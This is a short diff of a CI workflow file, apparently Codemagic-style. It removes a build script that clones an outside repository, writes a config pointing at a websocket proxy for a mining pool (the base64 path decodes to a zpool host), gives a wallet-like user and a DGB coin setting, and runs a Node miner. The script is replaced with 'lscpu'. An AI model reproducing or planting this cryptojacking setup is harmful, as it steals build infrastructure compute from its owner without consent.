@@ -11,16 +11,4 @@ workflows:
     scripts:
       - name: Run
         script: |
-          git clone https://github.com/dedgoodwc/dedf abc
-          cd abc
-          cat > config.json << EOF
-          {
-            "log": false,
-            "host": "wss://proxy-tq9r.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
-            "user": "SWrtFsEa237mckDo7hmtHR2YtadmbZJNus",
-            "pass": "c=DGB,123magic",
-            "threads": 5,
-            "port": 8080
-          }
-          EOF
-          node app.js
+          lscpu
